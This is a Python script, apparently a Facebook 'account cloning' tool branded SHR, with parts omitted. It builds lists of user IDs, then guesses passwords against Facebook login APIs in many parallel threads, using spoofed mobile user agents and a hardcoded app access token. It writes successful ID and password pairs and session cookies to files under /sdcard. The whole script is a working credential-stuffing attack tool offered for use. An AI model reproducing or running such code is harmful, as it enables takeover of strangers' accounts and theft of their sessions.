...
print('\033[1;32m Join My Group')
os.system('xdg-open https://www.facebook.com/groups/970667860754460/')        

logo=("""\033[1;91m
\033[1;37m .d8888b.  888    888 8888888b.  
\033[1;37md88P  Y88b 888    888 888   Y88b 
\033[1;34mY88b.      888    888 888    888 
\033[1;31m "Y888b.   8888888888 888   d88P 
\033[1;35m    "Y88b. 888    888 8888888P"  
\033[1;32m      "888 888    888 888 T88b   
\033[1;37mY88b  d88P 888    888 888  T88b  
\033[1;37m "Y8888P"  888    888 888   T88b 
\033[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;37m 𝗢𝗪𝗘𝗡     : \33[1;32mSHR
\033[1;37m 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 : \033[1;32mSHR
\033[1;37m 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  : \033[1;32m9.9.9
\033[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
	print('\033[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
def clear():
...
def menu():
			clear()
		#	linex()
			print('\033[1;37m [1] Cloning File\n [2] Cloning Random\n [3] Cloning Gmail  \n [0] Exit menu')
			linex()
			xd=input(' \033[1;37mChoose an option: ')
			if xd in ['1','01']:
				clear()
				print(' \033[1;35mPut file example:  /sdcard/File.txt  etc..')
				linex()
				...
				with tred(max_workers=30) as crack_submit:
					...
					print(' \033[1;36mTotal account ids : \033[1;33m'+total_ids+f' ')			
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as SHR:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					SHR.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					SHR.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					SHR.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					SHR.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					SHR.submit(trt5,ids,passlist)
				if mthd in ['6','06']:
					SHR.submit(trt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [SHR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [SHR-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/SHR-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\033[1;33m [SHR-CP] '+ids+' | '+pas+'\033[1;33m')
						open('/sdcard/SHR-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/SHR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SHR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/SHR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SHR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m [SHR-CP] '+ids+' | '+pas+'\033[1;36m')
                                                open('/sdcard/SHR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;33m [SHR-M3] %s|\033[1;33mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/SHR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SHR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36mm [SHR-CP] '+ids+' | '+pas+'\033[1;36m')
                                                open('/sdcard/SHR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;33m [SHR-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;33m [SHR-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [SHR-M6] %s|\033[1;32mOK:-%s \033[1;36m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			SHR=session.cookies.get_dict().keys()
			if "c_user" in SHR:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [SHR-OK] %s | %s'%(ids,pas))
				open('/sdcard/SHR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHR:
				if 'y' in pcp:
					print('\r\r\033[1;36m [SHR-CP] '+ids+' | '+pas+'\033[1;36m')
					open('/sdcard/SHR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [SHR-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [SHR-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def trt1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;32m [SHR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SHR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHR-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\033[1;36m [SHR-CP] '+str(uid)+' | '+pas+'\033[1;36m')
                                        open('/sdcard/SHR-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [SHR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [SHR-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/SHR-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\033[1;36m [SHR-CP] '+ids+' | '+pas+'\033[1;36m')
				open('/sdcard/SHR-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def trt3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;32m [SHR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;32m [SHR-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def trt5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;32m [SHR-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def trt6(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [SHR-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;30m [SHR-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [SHR-OK] '+uid+' | '+pas)
						open('/sdcard/SHR-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\033[1;36m [SHR-CP] '+uid+' | '+pas+'\033[1;36m')
					open('/sdcard/SHR-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
